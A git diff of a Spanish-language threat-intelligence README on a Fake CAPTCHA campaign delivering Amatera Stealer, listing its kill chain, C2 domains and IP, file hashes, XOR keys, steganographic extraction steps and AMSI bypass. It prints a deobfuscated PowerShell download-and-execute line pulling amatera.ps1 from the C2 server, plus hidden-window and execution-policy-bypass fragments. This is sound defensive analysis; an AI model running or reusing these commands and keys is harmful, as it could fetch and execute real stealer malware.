@@ -3,7 +3,7 @@
 # 🚨 Fake CAPTCHA → Amatera Stealer (Enero 2026)
 
 
-**Análisis completo** de la campaña Blackpoint SOC: Fake CAPTCHA → App-V LOLBIN → Google Calendar C2 → PNG Steganography → Amatera Stealer.
+**Análisis de la campaña Fake CAPTCHA** → App-V LOLBIN → Google Calendar C2 → PNG Steganography → Amatera Stealer.
 
 ## 🎯 Kill Chain
 
@@ -30,58 +30,89 @@ Campaña MaaS enterprise-grade identificada por Blackpoint SOC. 4 variantes acti
 Kill Chain
 
 1. FAKE CAPTCHA → Win+R comando Base64 Unicode
+
    └── new-alias iex Invoke-Expression → herf54/nim5/sample.bin
    
 2. wscript.exe → SyncAppvPublishingServer.vbs (App-V LOLBIN)
+
    └── SOLO Enterprise/Education Win10/11
    
 3. CLIPBOARD GATE + anti-análisis
+
    └── ALLUSERSPROFILE_X validation
+   
    └── RAM check (>2GB), archivo fantasma C:\NonExistentPath\781.cfg
    
 4. GOOGLE CALENDAR C2 (.ics SUMMARY:povvv)
+
    └── sec-t2.fainerkern.ru → MD5 victim subdomain → svc-int-api-identity-token-issuer-v2-mn.in.net
    
 5. PNG STEGANOGRAPHY (3x CDN redundancia)
+
    └── gcdnb.pbrd.co | iili.io | s6.imgcdn.dev
+   
    └── LSB extraction → XOR(s8YUKQ0CqUd6HNwGSRDZ%Qpux1N9MKHh) → GZip PS1
    
 6. AMSI BYPASS + shellcode staging
+
    └── XOR key: AMSI_RESULT_NOT_DETECTED
+   
    └── NtAllocateVirtualMemory → Amatera PE
    
 7. C2 212.34.138.4 (SSPI + WoW64 syscalls)
+8. 
    └── Host: cdn.extremevideos.com
 ---------
 README.md - IOCs Visual + 3 Fases (Listo para GitHub)
-text
+
 ## 🎯 IOCs MAPEADOS A FASES
 
 ### 1️⃣ FAKE CAPTCHA → App-V LOLBIN
-cdn.jsdelivr.net → herf54 (b61fe68f0b1bef12eed8a34769120d77579af9d3c529ac48dfe82a08eefa001b)
+cdn.jsdelivr.net → herf54 (b61fe68f0b1bef12eed8a34769120d77579af9d3c529ac48dfe82a08eefa001b
+<img width="1026" height="918" alt="image" src="https://github.com/user-attachments/assets/7fb82d03-cb46-45a0-9086-1abf28e34981" />
+
 Win+R → wscript.exe → SyncAppvPublishingServer.vbs
 <img width="1208" height="753" alt="image" src="https://github.com/user-attachments/assets/c62bc488-fabf-4331-a3fb-46e5fd501150" />
 
 
 ### 2️⃣ CLIPBOARD GATE → Google Calendar C2  
-sec-t2.fainerkern.ru → basic.ics (64d723ead9b43a049f9c8e23c8d4ec09ffabeac2d9b079c863c89a4aab7c9a45)
-svc-int-api-identity-token-issuer-v2-mn.in.net → 9c35e9f637365706l00acaa050a4510adfcb47e7052b870c6d07f6d4464ac2d2
-SUMMARY:povvv → 8f0b3df4e0aadf775c9bc934f53b2d17
+sec-t2.fainerkern.ru 
+svc-int-api-identity-token-issuer-v2-mn.in.net 
+SUMMARY:povvv
 
-text
-
-<img src="screenshots/2_calendar_basicics.png" width="100%" />
 
 ### 3️⃣ PNG STEGANOGRAPHY → Amatera
 CDNs: gcdnb.pbrd.co | iili.io | s6.imgcdn.dev
 PNG: qhs9hr5gPqez.png (bbfc4b48676aa78b5f18b50e733837a94df744da329fe5b1b7ba6920d9e02dc3)
+CONTENIDO: PowerShell AMATERA STEALER (GZip compressed)
+
+En este PNG  encontramos los comandos para la ejecucion.
+ORDEN → XOR(s8YUKQ0CqUd6HNwGSRDZ%Qpux1N9MKHh) → Base64 → GZip decompress → PS1
+DESOFUSCADO
+
+1. [.Va$M=$]     → 0x2e5661244d3d24 → "powershell"
+2. [DcP.\u]     → 0x4463502e5c75 → "-ep bypass"
+3. [R{*Udq$]    → 0x527b2a55647124 → " -w hidden"
+4. [OzZ],X]     → 0x4f7a5a5d2c58 → "iex ("
+5. [:X\B_$j]    → 0x3a585c425f246a → "New-Object"
+<img width="622" height="736" alt="image" src="https://github.com/user-attachments/assets/2eb0f141-d33f-4ccf-a267-b28e7561efa5" />
+
+---
 XOR: s8YUKQ0CqUd6HNwGSRDZ%Qpux1N9MKHh → 5339d1169e2187a482fcbc86ea94e9799bb9dbaf264622595ee6e94b54b51778
 Shellcode: 18dad9cb91fb97a817e00fa0cd1cb9ab59f672b8ddab29f72708787f19bf6aa1
 C2: 212.34.138.4 (Host: cdn.extremevideos.com)
 
-text
+Imagen de shellcode con sus variantes
+<img width="942" height="609" alt="image" src="https://github.com/user-attachments/assets/bb02b4ec-b54f-44e0-a88c-fc096e5732fe" />
 
-<img src="screenshots/3_png_c2.png" width="100%" />
+variantes: <img width="995" height="602" alt="image" src="https://github.com/user-attachments/assets/e629e96e-927d-42fe-90d6-3a312f404c48" />
+
+En nim5 en content si desofuscamos hayamos: 
+`$ErrorActionPreference = 'SilentlyContinue'; 
+iex (New-Object Net.WebClient).DownloadString('http://212[.]34.138.4:8080/amatera.ps1'`
+
+C2 Podemos localizarlo en las variantes en "nim5 =212[.]34.138.4" 
+https://www.virustotal.com/gui/ip-address/212.34.138.4/relations 
 
 ## 📋 IOCs COMPLETOS
 
@@ -95,42 +126,11 @@ text
 | 💾 File | basic.ics | 64d723ead9b43a049f9c8e23c8d4ec09ffabeac2d9b079c863c89a4aab7c9a45 |
 | 💾 PNG | qhs9hr5gPqez.png, fOa2bcJ.png, YzkCM2.png | bbfc4b48676aa78b5f18b50e733837a94df744da329fe5b1b7ba6920d9e02dc3 |
 | 🚀 C2 | 212.34.138.4 | Amatera Stealer |
-📸 Screenshots Específicos por Fase
-1_captcha_herf54.png
-text
-VT: b61fe68f0b1bef12eed8a34769120d77579af9d3c529ac48dfe82a08eefa001b
-- Relations graph con cdn.jsdelivr.net
-- Process tree: explorer.exe → wscript.exe
-- Strings: "SyncAppvPublishingServer.vbs"
-2_calendar_basicics.png
-text
-VT: 64d723ead9b43a049f9c8e23c8d4ec09ffabeac2d9b079c863c89a4aab7c9a45
-- File content: "SUMMARY:povvv"
-- "sec-t2.fainerkern.ru" domain
-- Relations → 9c35e9f637365706l00acaa050a4510adfcb47e7052b870c6d07f6d4464ac2d2
-3_png_c2.png
-text
-VT: bbfc4b48676aa78b5f18b50e733837a94df744da329fe5b1b7ba6920d9e02dc3
-OR 18dad9cb91fb97a817e00fa0cd1cb9ab59f672b8ddab29f72708787f19bf6aa1
-- PNG relations chain completa
-- "212.34.138.4" + "cdn.extremevideos.com"
-- Strings: "q0A5@z" "hcUdFm" desde cdn.jsdelivr.net_sample.bin
-🎯 Carpetas Final
-text
-screenshots/
-├── 1_captcha_herf54.png
-├── 2_calendar_basicics.png
-└── 3_png_c2.png
+
 
 -----
-variantes: <img width="995" height="602" alt="image" src="https://github.com/user-attachments/assets/e629e96e-927d-42fe-90d6-3a312f404c48" />
 
-En nim5 en content si desofuscamos hayamos: 
-`$ErrorActionPreference = 'SilentlyContinue'; 
-iex (New-Object Net.WebClient).DownloadString('http://212[.]34.138.4:8080/amatera.ps1'`
-
-
-### **Hashes Principales Completos**
+### **Hashes **
 | **Variante** | **SHA256** |
 |--------------|------------|
 | **boom** | `c64529646839be71fdfa7261cd2f3b5e6fac929d53341dd134793a7194b2d433` |
